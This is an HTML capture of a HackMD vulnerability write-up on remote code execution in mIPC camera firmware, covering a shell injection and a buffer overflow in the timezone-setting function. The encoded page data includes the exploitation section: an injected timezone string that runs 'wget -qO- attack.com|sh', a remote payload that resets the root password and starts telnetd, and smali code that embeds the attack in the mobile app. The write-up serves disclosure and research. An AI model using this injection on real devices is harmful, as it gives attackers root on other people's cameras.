<!DOCTYPE html>
<html lang="en-US" data-themeable="true">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="csrf-token" content="rHJM6x9e-Sxt6tF0v4fT-hB7_wq1n491YLpE">
    
    
    <meta name="description" content="# mIPC firmware RCE By Joshua Wang  Firmware version: v5.3.1.2003161406 (latest?)  ## Overview Unsan">
    
    <title>mIPC firmware RCE - HackMD</title>
    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
	<link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
	<!--  meta value for server side given sign in boolean -->
    <meta name="signin" content="false">

    
<script nonce="a41a463c-6ec7-4fc3-a8a5-41fdc8e6693c">
  window.domain = 'hackmd.io'
  window.urlpath = ''
  window.debug = false || window.localStorage.getItem('HMD_DEBUG_FLAG') === 'true'
  window.version = '1.3.0'
  window.brand = 'HackMD'

  
  window.NOTE_ID = '8LMVlIWdTOSbMp_wiGpiwA'
  

  window.GOOGLE_DRIVE_API_KEY = 'AIzaSyAHmcP5gL_64ZafuAYOvJruFAIaYgHQaY4'
  window.GOOGLE_DRIVE_CLIENT_ID = '65857506266-76uhhee8se8dgs1i0q8fhtj1prg0ar27.apps.googleusercontent.com'
  window.DROPBOX_APP_KEY = 'rdoizrlnkuha23r'
  
  window.PLANTUML_SERVER = 'https://ptuml.hackmd.io'

  window.ASSET_URL = 'https://assets.hackmd.io'

  window.USER_CAN_CREATE_TEAM = true
  window.USER_CAN_DELETE_ACCOUNT = true
  window.USER_DELETE_ACCOUNT_VIA_EMAIL = true
  window.PAYMENT_ENABLED = true
  window.PAYMENT_PROMOTION_BANNER_ENABLED = false
  window.GITHUB_SYNC_ENABLED = true
  window.GITLAB_SYNC_ENABLED = false
  window.GITLAB_SYNC_BASE_URL = ''
  window.VCS_SYNC_MODE = 'github'
  window.VCS_PROVIDER_NAME = 'GitHub'
  window.FREE_TEAM_NUM = 20
  window.FREE_TEAM_MEMBER_NUM = 3
  window.FREE_PUBLIC_TEAM_NUM = 10
  window.NEO_OVERVIEW_UI = false
  window.FOLDER_ENABLE = false
  
  window.EE_SITE_ENABLE = false
  window.EE_SITE_NAME = 'false'
  window.EE_SITE_LINK = 'false'
  window.EESITE_INFO = false
  window.ENTERPRISE_DISCOVERY_ENABLE = false
  window.ENTERPRISE_DISCOVERY_TEAM = true
  window.ENTERPRISE_DISCOVERY_NOTE = true
  window.ENTERPRISE_DISCOVERY_VIEW_PERMISSION = 'guest'
  
  window.ALLOW_ANONYMOUS = true
  window.ALLOW_ANONYMOUS_EDIT = false
  window.ALLOW_DOWNLOAD_PDF = true
  window.PUBLIC_OVERVIEW = false
  window.INTERNAL_PUBLIC_OVERVIEW = false
  window.FULL_TEXT_SEARCH_ENABLE = false
  window.ALGOLIA_SEARCH_ENABLE = true
  window.MARKETING_EMAIL_ENABLE = true
  window.OFFLINE_ACCESS = true
  
  
  
    window.WALLET_CONNECT_PROJECT_ID = '91d6fa182b725b5895a17a170a5878c1'
  
  window.API_MANAGEMENT_UI_ENABLE = true
  window.FEEDBACK_UI_ENABLE = true
  window.PUBLISH_ENABLE = true

  

  
  window.SHOW_HOT_NOTES = false
  

  
  window.HOT_NOTES_TIME_TYPE = 'week'
  

  
  window.SHOW_OVERVIEW = false
  

  
  window.MENTIONS = {}
  

  
  window.MENTION_ANCHORS = []
  

  
  window.COMMENT_ANCHORS = []
  

  
  window.IS_OWNER = false
  

  
  window.IS_TEAM_ADMIN = false
  

  
  window.IS_INVITEE_ADMIN = false
  

  
  window.USER_PROFILE = '%7B%22name%22%3A%22Guest%20Clarke%22%7D'
  

  
  window.VERSION_TIME = '1656881325400'
  

  
  window.canEdit = false
  

  
  window.canWriteComment = true
  

  
  window.canHideComment = false
  

  window.TRASH_NOTE_DELETE_AFTER_FREE = 3
  window.TRASH_NOTE_DELETE_AFTER_PAID = 30

  
    window.ENABLED_PREVIEW_FEATURE = {}
  

  
    window.IS_OWNER_UPGRADED = false
  

  
    window.IMGUR_FALLBACK_CDN = 'https://imgur-backup.hackmd.io'
  

  
    window.CLOUD_META_UI = true
  
  
    window.CLOUD_META_API = true
  
  
    window.CLOUD_META_MIGRATION = false
  
  
    window.YAML_METADATA_ENABLED = false
  

  
    window.NOTE_CAPACITY_LIMIT = 50
  

  
    window.DOCUMENT_MAX_LENGTH = 100000
  

  
    window.SOCIAL_NETWORK_FEATURES_ENABLED = true
  

  
    window.PUBLISHMENT_MODERATION_ENABLED = true
  

  
    window.COMMENT_ENABLED = true
  

  window.SUGGEST_EDIT_ENABLED = true
  
    window.SUGGEST_EDIT_ENABLED = true
  

  
    window.REALTIME_CLIENT_WITH_CREDENTIALS = false
  

  
    window.COMMENT_ENABLED = true
  

  
    window.DEBUG_DISCONNECT_SOCKET_WHEN_OFFLINE = false
  

  

  

  
    window.USE_NEW_LOGO = true
  

  
    window.ITERABLE_ENABLED = true
  
  
    window.ITERABLE_API_KEY = "c2c36a44c2614fb19aa3b46d660bbce2"
  

  
    window.TEXT_SELECTION_CHANGED = false
  

  
    window.CAN_VIEW_HISTORY_AT_REVISION = false
  
</script>


    
<!-- Google Tag Manager -->
<script nonce="a41a463c-6ec7-4fc3-a8a5-41fdc8e6693c">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KLW9Z3');</script>
<!-- End Google Tag Manager -->


    





    <meta property="fb:app_id" content="1436904003272070">



    <meta name="twitter:image:src" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta name="twitter:image:alt" content="mIPC firmware RCE - HackMD">


<meta name="twitter:site" content="@hackmdio" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="mIPC firmware RCE - HackMD" />


    <meta name="twitter:description" content="# mIPC firmware RCE By Joshua Wang  Firmware version: v5.3.1.2003161406 (latest?)  ## Overview Unsan" />



    <meta property="og:image" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta property="og:image:alt" content="mIPC firmware RCE - HackMD">


<meta property="og:site_name" content="HackMD" />
<meta property="og:type" content="article" />
<meta property="og:title" content="mIPC firmware RCE - HackMD" />


    <meta property="og:description" content="# mIPC firmware RCE By Joshua Wang  Firmware version: v5.3.1.2003161406 (latest?)  ## Overview Unsan" />




     <link href="https://assets.hackmd.io/build/font-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/font-vendor.ea8218d7d4f468b2c430.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.0a08ae20e14fefe857eb.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.db0e7b64c54d0a77290f.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.0aea8f534414dc7f184c.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
<![endif]-->

    


    <script defer data-domain="hackmd.io" src="https://plausible.io/js/script.js"></script>
<script nonce="a41a463c-6ec7-4fc3-a8a5-41fdc8e6693c">
  window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments); }
  const keyboardWhiteList = ['a', 'span', 'button']

  function getTaggedEventAttributes (e) {
    const eventAttrs = { name: null, props: {} }
    if (!e || !e.classList) return eventAttrs
    const psEvent = /plausible-event-(.+)(=|--)(.+)/
    for (const className of [...e.classList]) {
      const [, key, , val] = className.match(psEvent) || []
      if (!key || !val) continue
      const value = val.replace(/\+/g, ' ')
      switch (key.toLowerCase()) {
        case 'name':
          eventAttrs.name = value
          break
        default:
          eventAttrs.props[key] = value
          break
      }
    }
    return eventAttrs
  }

  function isLocal () {
    return /^localhost$|^127(\.[0-9]+){0,2}\.[0-9]+$|^\[::1?\]$/.test(location.hostname) || location.protocol === 'file:'
  }

  function isAutomation () {
    return Boolean(window._phantom || window.__nightmare || window.navigator.webdriver || window.Cypress)
  }

  function shouldIgnore () {
    return isLocal() ||
      isAutomation() ||
      window.localStorage.getItem('plausible_ignore') === 'true'
  }

  function handler (e) {
    if (!window.plausible) return
    if (!e.target || !('className' in e.target)) return
    const ele = e.target

    const eventAttrs = getTaggedEventAttributes(ele)
    if (!eventAttrs.name) return
    if (ele?.href) eventAttrs.props.url = ele.href

    if (shouldIgnore()) {
      if (window.debug) logDebugEventMsg(eventAttrs)
      return
    }
    window.plausible(eventAttrs.name, { props: eventAttrs.props })
  }

  function logDebugEventMsg (eventAttrs) {
    console.warn(
      `Ignoring Event: "${eventAttrs.name}"`,
      eventAttrs,
    )
  }

  function keydownHandler (e) {
    if (e.key !== 'Enter') return
    if (e.target.nodeName.toLowerCase() === 'input') {
      switch (e.target.type.toLowerCase()) {
        case 'submit':
        case 'button':
        case 'reset':
        case 'checkbox':
        case 'radio':
        case 'file':
        case 'image':
        case 'color':
          break
        default:
          return
      }
    } else if (!keyboardWhiteList.includes(e.target.nodeName.toLowerCase())) {
      return
    }
    handler(e)
  }

  document.addEventListener('mousedown', handler)
  document.addEventListener('keydown', keydownHandler)
</script>

    
<script nonce="a41a463c-6ec7-4fc3-a8a5-41fdc8e6693c">
  window.publishProps = JSON.parse(`{"isOwnerAnonymous":false,"isOwnedByTeam":false,"ownerInfo":{"name":"Joshua%20Wang","path":"_zOX-PXQQFmCETA_RZIgow","avatarUrl":"https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F32721284%3Fs%3D96","description":null},"isPublished":false,"createTime":1656870575652,"updateTime":1656881325400,"vcsSyncMode":"github","vcsProviderName":"GitHub","canEdit":false,"hardBreaks":true,"onlyOwnerCanEdit":true,"isCommentEnabled":true,"likedCount":0,"isNotificationEnabled":true,"notificationType":"never","hasEmail":false,"canWriteComment":true,"viewCount":9452,"markdown":"%23%20mIPC%20firmware%20RCE%0ABy%20Joshua%20Wang%0A%0AFirmware%20version%3A%20v5.3.1.2003161406%20(latest%3F)%0A%0A%23%23%20Overview%0AUnsanitized%20input%20when%20setting%20a%20%60UTC(%5C%2B%7C%5C-).*%60%20locale%20file%20leads%20to%20shell%20injection.%20A%20stack-based%20buffer%20overflow%20also%20exists.%20This%20allows%20an%20attacker%20to%20gain%20remote%20code%20execution%2C%20but%20requires%20the%20attacker%20to%20be%20authenticated%20in%20the%20mobile%20application%20to%20interface%20with%20the%20camera%20running%20mIPC.%0A%0A%23%23%20Vulnerability%0AAfter%20receiving%20a%20firmware%20dump%20of%20a%20Lefun%20camera%2C%20which%20runs%20mIPC%20firmware%2C%20I%20noted%20the%20following%20in%20the%20startup%20process%3A%0A-%20telnetd%20is%20killed%0A-%20the%20root%20password%20is%20randomized%20and%20effectively%20un-bruteforceable%0A%0AI%20turned%20to%20searching%20through%20the%20mIPC%20binary%20for%20calls%20to%20%60system%60%2C%20looking%20for%20possible%20injections.%0A%0AThe%20mIPC%20mobile%20application%20allows%20one%20to%20choose%20the%20timezone%20that%20the%20camera's%20system%20should%20operate%20with.%20I%20believe%20this%20is%20used%20for%20the%20on-screen%20display's%20time%20feature.%20One%20thing%20that%20stood%20out%20to%20me%20is%20that%20the%20firmware%20dump%20also%20included%20various%20different%20locale%20files%20for%20setting%20a%20timezone.%0A%0A%60%60%60%0A.%2Fbackupfs%2Fapps%2Fapp%2Fipc%2Fdata%2Fcfg%2Fzoneinfo%2F%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B00_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B01_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-01_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B02_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-02_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B03_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-03_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B03_30%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-03_30%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B04_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-04_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B04_30%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-04_30%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B05_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-05_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B05_30%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B05_45%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B06_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-06_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B06_30%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B07_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-07_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B08_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-08_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B09_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-09_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B09_30%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-09_30%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B10_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-10_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B10_30%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B11_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC-11_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B12_00%0A%E2%94%9C%E2%94%80%E2%94%80%20UTC%2B13_00%0A%E2%94%94%E2%94%80%E2%94%80%20UTC%2B14_00%0A%60%60%60%0A%0AThe%20vulnerable%20function%20is%20found%20at%20offset%20%600x0013e91c%60.%20I%20re-labeled%20and%20re-typed%20the%20decompilation%20in%20Ghidra.%0A%0A%60%60%60c%0A%0Aint%20choose_utc_timezone(undefined4%20param_1%2Cchar%20*param_2)%0A%7B%0A%20%20int%20iVar1%3B%0A%20%20char%20*pcVar2%3B%0A%20%20char%20acStack192%20%5B128%5D%3B%0A%20%20char%20acStack64%20%5B40%5D%3B%0A%20%20%0A%20%20if%20(param_2%20%3D%3D%20(char%20*)0x0)%20%7B%0A%20%20%20%20iVar1%20%3D%20-1%3B%0A%20%20%7D%0A%20%20else%20%7B%0A%20%20%20%20strcpy(acStack64%2Cparam_2)%3B%0A%20%20%20%20pcVar2%20%3D%20strchr(acStack64%2C0x3a)%3B%0A%20%20%20%20if%20(pcVar2%20!%3D%20(char%20*)0x0)%20%7B%0A%20%20%20%20%20%20*pcVar2%20%3D%20'_'%3B%0A%20%20%20%20%7D%0A%20%20%20%20iVar1%20%3D%20access(%22%2Fetc%2FTZ%22%2C0)%3B%0A%20%20%20%20if%20(iVar1%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20sprintf(acStack192%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22cp%20..%2F..%2F..%2Fapps%2Fapp%2Fipc%2Fdata%2Fcfg%2Fzoneinfo%2F%25s%20%2Fetc%2FTZ%3B%20cp%20%2Fetc%2FTZ%20..%2Fdata%2F%3B%20%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20acStack64)%3B%0A%20%20%20%20%20%20system(acStack192)%3B%0A%20%20%20%20%7D%0A%20%20%20%20else%20%7B%0A%20%20%20%20%20%20sprintf(acStack192%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22cp%20..%2F..%2F..%2Fapps%2Fapp%2Fipc%2Fdata%2Fcfg%2Fzoneinfo%2F%25s%20%2Fetc%2Flocaltime%3B%20cp%20%2Fetc%2Flocaltime%20%20%20..%2F%20data%2F%3B%20%22%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2CacStack64)%3B%0A%20%20%20%20%20%20system(acStack192)%3B%0A%20%20%20%20%20%20iVar1%20%3D%200%3B%0A%20%20%20%20%7D%0A%20%20%7D%0A%20%20return%20iVar1%3B%0A%7D%0A%60%60%60%0A%0AIt%20appears%20that%20the%20name%20of%20a%20timezone%20filename%20is%20passed%20in%20through%20%60param_2%60.%20It%20is%20then%20strcpy'd%20to%20%60acStack64%60.%20Then%2C%20it%20is%20formatted%20into%20a%20shell%20command%20using%20%60sprintf%60%20and%20then%20passed%20to%20%60system%60.%20The%20command%20copies%20a%20selected%20locale%20file%20from%20the%20previously%20mentioned%20directory%20into%20%60%2Fetc%2FTZ%60%2C%20effectively%20setting%20the%20locale.%0A%0AIt%20is%20important%20to%20note%20that%20mIPC%20by%20default%20uses%20another%20method%20to%20set%20a%20timezone%20besides%20copying%20a%20locale%20file%2C%20but%20these%20were%20not%20(to%20my%20knowledge)%20vulnerable%20due%20to%20sanitization.%0A%0A%0AIn%20this%20function%2C%20we%20can%20see%20two%20vulnerabilities.%20First%2C%20the%20%60strcpy%60%20allows%20us%20to%20copy%20more%20than%2040%20bytes%20into%20%60acStack64%60.%20One%20may%20argue%20that%20a%20length%20check%20occurred%20outside%20of%20this%20function%2C%20but%20I%20verified%20it%20experimentally%20and%20it%20indeed%20crashed%20the%20binary.%0A%0ASecond%2C%20we%20can%20command-inject%20our%20way%20into%20the%20system!%20We%20just%20need%20our%20input%20to%20start%20with%20a%20valid%20locale%20filename%20(%60UTC%2B01_00%60%2C%20etc)%20in%20order%20for%20the%20binary%20to%20reach%20this%20function%20(I%20also%20verified%20this%20experimentally).%20I%20could%20not%20find%20the%20parent%20calling%20function%2C%20but%20it%20may%20be%20that%20the%20developer%20used%20a%20%60strncmp%60%20and%20only%20verified%20the%20first%20couple%20bytes%20of%20input%20to%20match%20a%20valid%20locale%20filename.%0A%0A%0A%23%23%20Exploitation%0AI%20decided%20to%20exploit%20the%20command%20injection.%20Using%20APKtool%2C%20I%20dumped%20the%20mIPC%20mobile%20application%20and%20reverse%20engineered%20the%20behavior%20that%20sets%20timezones.%0A%0AI%20first%20instantiated%20a%20%60mcld_ctx_time_set%60%20object.%20The%20definition%20for%20it%3A%0A%60%60%60%0A.class%20public%20Lcom%2Fmining%2Fcloud%2Fbean%2Fmcld%2Fmcld_ctx_time_set%3B%0A.super%20Lcom%2Fmining%2Fcloud%2Fbean%2Fmcld%2Fmcld_ctx%3B%0A.source%20%22mcld_ctx_time_set.java%22%0A%0A%0A%23%20instance%20fields%0A.field%20public%20auto_sync%3AI%0A%0A.field%20public%20day%3AI%0A%0A.field%20public%20hour%3AI%0A%0A.field%20public%20min%3AI%0A%0A.field%20public%20mon%3AI%0A%0A.field%20public%20ntp_addr%3ALjava%2Flang%2FString%3B%0A%0A.field%20public%20sec%3AI%0A%0A.field%20public%20timezone%3ALjava%2Flang%2FString%3B%0A%0A.field%20public%20type%3ALjava%2Flang%2FString%3B%0A%0A.field%20public%20year%3AI%0A%0A%0A%23%20direct%20methods%0A.method%20public%20constructor%20%3Cinit%3E()V%0A%20%20%20%20.locals%200%0A%0A%20%20%20%20.line%206%0A%20%20%20%20invoke-direct%20%7Bp0%7D%2C%20Lcom%2Fmining%2Fcloud%2Fbean%2Fmcld%2Fmcld_ctx%3B-%3E%3Cinit%3E()V%0A%0A%20%20%20%20return-void%0A.end%20method%0A%60%60%60%0A%0AThe%20locale%20filename%20(%60param_2%60)%20is%20expected%20in%20the%20%60timezone%60%20field.%20Because%20of%20the%20buffer%20overflow%2C%20we%20are%20constrainted%20to%20%3C%2040%20characters%20in%20this%20injection%2C%20including%20the%20bytes%20at%20the%20beginning%20for%20a%20valid%20locale%20filename.%20Otherwise%2C%20we%20will%20crash%20the%20mIPC%20binary.%0A%0ATo%20circumvent%20this%2C%20I%20decided%20to%20host%20my%20actual%20payload%20on%20a%20remote%20server%2C%20and%20execute%20it%20by%20calling%20%60wget%60%20and%20piping%20the%20output%20into%20%60sh%60.%20This%20gives%20me%20unlimited%20access%20to%20the%20shell.%0A%0AI%20set%3A%0A-%20type%20%3D%3D%20%60NTP%60%0A-%20timezone%20%3D%3D%20%60UTC%2B01_00%3Bwget%20-qO-%20attack.com%7Csh%20%23%60%0A-%20auto_sync%20%3D%201%0A-%20sn%20%3D%3D%20a%20serial%20number%20I%20got%20from%20calling%20%60McldActivityLivePlay-%3EmSerialNumber%60%0A-%20handler%20%3D%3D%20%60McldActivityLivePlay-%3EcustomTimeSetHandler%60%0A%0AI%20then%20invoked%20%60mcld_agent-%3Etime_set%60%20with%20this%20object%20and%20a%20couple%20other%20retrieved%20configurations%20to%20set%20the%20locale.%20See%20%5Bhere%5D(%23Full-payload)%20for%20the%20full%20thing.%20%0A%0AMy%20remote%20payload%20just%20consisted%20of%20changing%20the%20root%20password%20with%20%60echo%20%22root%3Aroot%22%20%7C%20chpasswd%60%20and%20starting%20telnetd.%20Recall%20that%20the%20root%20password%20is%20randomized%20on%20startup.%0A%0ATo%20make%20it%20easier%20for%20my%20coworker%2C%20Chris%2C%20to%20collect%20data%20(we%20were%20remote)%2C%20I%20embedded%20my%20exploit%20into%20the%20%60onCreate%60%20method%20of%20the%20%60McIdActivityLivePlay%60%20class.%20This%20meant%20as%20soon%20as%20someone%20views%20the%20camera%2C%20the%20attack%20is%20run.%0A%0AI%20re-compiled%20the%20application%20with%20apktool%2C%20signed%20it%2C%20and%20installed%20it%20via%20ADB.%0A%0A!%5B%5D(https%3A%2F%2Fi.imgur.com%2FfBdlPHf.png)%0A%0A%0A%23%23%20Full%20payload%0AI%20learned%20way%20too%20much%20about%20Dalvik.%0A%0A%60%60%60%0A%20%20%20%20new-instance%20v1%2C%20Lcom%2Fmining%2Fcloud%2Fbean%2Fmcld%2Fmcld_ctx_time_set%3B%0A%0A%20%20%20%20invoke-direct%20%7Bv1%7D%2C%20Lcom%2Fmining%2Fcloud%2Fbean%2Fmcld%2Fmcld_ctx_time_set%3B-%3E%3Cinit%3E()V%0A%0A%0A%0A%20%20%20%20const-string%20v2%2C%20%22NTP%22%0A%0A%0A%0A%20%20%20%20iput-object%20v2%2C%20v1%2C%20Lcom%2Fmining%2Fcloud%2Fbean%2Fmcld%2Fmcld_ctx_time_set%3B-%3Etype%3ALjava%2Flang%2FString%3B%0A%0A%0A%0A%0A%0A%0A%20%20%20%20const-string%20v2%2C%20%22UTC%2B01_00%3Bwget%20-qO-%20attack.com%7Csh%20%23%22%0A%0A%0A%20%20%20%20iput-object%20v2%2C%20v1%2C%20Lcom%2Fmining%2Fcloud%2Fbean%2Fmcld%2Fmcld_ctx_time_set%3B-%3Etimezone%3ALjava%2Flang%2FString%3B%0A%0A%0A%20%20%20%20const%2F4%20v2%2C%200x1%0A%20%20%20%20%0A%20%20%20%20%0A%20%20%20%20iput%20v2%2C%20v1%2C%20Lcom%2Fmining%2Fcloud%2Fbean%2Fmcld%2Fmcld_ctx_time_set%3B-%3Eauto_sync%3AI%0A%0A%0A%0A%0A%0A%0A%0A%20%20%20%20iget-object%20v2%2C%20p0%2C%20Lcom%2Fmining%2Fcloud%2Factivity%2FMcldActivityLivePlay%3B-%3EmSerialNumber%3ALjava%2Flang%2FString%3B%0A%0A%0A%20%20%20%20iput-object%20v2%2C%20v1%2C%20Lcom%2Fmining%2Fcloud%2Fbean%2Fmcld%2Fmcld_ctx_time_set%3B-%3Esn%3ALjava%2Flang%2FString%3B%0A%0A%0A%0A%0A%20%20%20%20iget-object%20v2%2C%20p0%2C%20Lcom%2Fmining%2Fcloud%2Factivity%2FMcldActivityLivePlay%3B-%3EcustomTimeSetHandler%3ALandroid%2Fos%2FHandler%3B%0A%0A%20%20%20%20iput-object%20v2%2C%20v1%2C%20Lcom%2Fmining%2Fcloud%2Fbean%2Fmcld%2Fmcld_ctx_time_set%3B-%3Ehandler%3ALandroid%2Fos%2FHandler%3B%0A%0A%0A%0A%0A%0A%0A%0A%20%20%20%20iget-object%20v3%2C%20p0%2C%20Lcom%2Fmining%2Fcloud%2Factivity%2FMcldActivityLivePlay%3B-%3EmApp%3ALcom%2Fmining%2Fcloud%2Fapplication%2FMcldApp%3B%0A%0A%20%20%20%20iget-object%20v3%2C%20v3%2C%20Lcom%2Fmining%2Fcloud%2Fapplication%2FMcldApp%3B-%3EmAgent%3ALcom%2Fmining%2Fcloud%2Fmcld_agent%3B%0A%0A%20%20%20%20invoke-virtual%20%7Bv3%2C%20v1%7D%2C%20Lcom%2Fmining%2Fcloud%2Fmcld_agent%3B-%3Etime_set(Lcom%2Fmining%2Fcloud%2Fbean%2Fmcld%2Fmcld_ctx_time_set%3B)V%0A%60%60%60","viewMode":"publish","isOwner":false,"isSignIn":false,"isLiked":false,"isBookmarked":false,"publishType":"view","commentCount":0,"isNotesRecommendationsEnabled":true,"recommendedNotes":[],"lastChangeUserInfo":{"name":"Joshua%20Wang","path":"_zOX-PXQQFmCETA_RZIgow","avatarUrl":"https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F32721284%3Fs%3D96"}}`);
  (function () {
    const decodeStringProps = (props) => {
      for (const key in props) {
        if (typeof props[key] === 'string') {
          props[key] = decodeURIComponent(props[key])
        } else if (typeof props[key] === 'object') {
          decodeStringProps(props[key])
        }
      }
    }
    decodeStringProps(window.publishProps)
  })()
</script>

    <script src="https://tally.so/widgets/embed.js"></script>

    
</head>

<body style="display:none;">
    <div id="toasts-container" class="toasts-container z-[2000]"></div>
    <div id="publish-page"># mIPC firmware RCE
By Joshua Wang

Firmware version: v5.3.1.2003161406 (latest?)

## Overview
Unsanitized input when setting a `UTC(\+|\-).*` locale file leads to shell injection. A stack-based buffer overflow also exists. This allows an attacker to gain remote code execution, but requires the attacker to be authenticated in the mobile application to interface with the camera running mIPC.

## Vulnerability
After receiving a firmware dump of a Lefun camera, which runs mIPC firmware, I noted the following in the startup process:
- telnetd is killed
- the root password is randomized and effectively un-bruteforceable

I turned to searching through the mIPC binary for calls to `system`, looking for possible injections.

The mIPC mobile application allows one to choose the timezone that the camera&#39;s system should operate with. I believe this is used for the on-screen display&#39;s time feature. One thing that stood out to me is that the firmware dump also included various different locale files for setting a timezone.

```
./backupfs/apps/app/ipc/data/cfg/zoneinfo/
├── UTC+00_00
├── UTC+01_00
├── UTC-01_00
├── UTC+02_00
├── UTC-02_00
├── UTC+03_00
├── UTC-03_00
├── UTC+03_30
├── UTC-03_30
├── UTC+04_00
├── UTC-04_00
├── UTC+04_30
├── UTC-04_30
├── UTC+05_00
├── UTC-05_00
├── UTC+05_30
├── UTC+05_45
├── UTC+06_00
├── UTC-06_00
├── UTC+06_30
├── UTC+07_00
├── UTC-07_00
├── UTC+08_00
├── UTC-08_00
├── UTC+09_00
├── UTC-09_00
├── UTC+09_30
├── UTC-09_30
├── UTC+10_00
├── UTC-10_00
├── UTC+10_30
├── UTC+11_00
├── UTC-11_00
├── UTC+12_00
├── UTC+13_00
└── UTC+14_00
```

The vulnerable function is found at offset `0x0013e91c`. I re-labeled and re-typed the decompilation in Ghidra.

```c

int choose_utc_timezone(undefined4 param_1,char *param_2)
{
  int iVar1;
  char *pcVar2;
  char acStack192 [128];
  char acStack64 [40];
  
  if (param_2 == (char *)0x0) {
    iVar1 = -1;
  }
  else {
    strcpy(acStack64,param_2);
    pcVar2 = strchr(acStack64,0x3a);
    if (pcVar2 != (char *)0x0) {
      *pcVar2 = &#39;_&#39;;
    }
    iVar1 = access(&#34;/etc/TZ&#34;,0);
    if (iVar1 == 0) {
      sprintf(acStack192,
              &#34;cp ../../../apps/app/ipc/data/cfg/zoneinfo/%s /etc/TZ; cp /etc/TZ ../data/; &#34;,
              acStack64);
      system(acStack192);
    }
    else {
      sprintf(acStack192,
              &#34;cp ../../../apps/app/ipc/data/cfg/zoneinfo/%s /etc/localtime; cp /etc/localtime   ../ data/; &#34;
              ,acStack64);
      system(acStack192);
      iVar1 = 0;
    }
  }
  return iVar1;
}
```

It appears that the name of a timezone filename is passed in through `param_2`. It is then strcpy&#39;d to `acStack64`. Then, it is formatted into a shell command using `sprintf` and then passed to `system`. The command copies a selected locale file from the previously mentioned directory into `/etc/TZ`, effectively setting the locale.

It is important to note that mIPC by default uses another method to set a timezone besides copying a locale file, but these were not (to my knowledge) vulnerable due to sanitization.


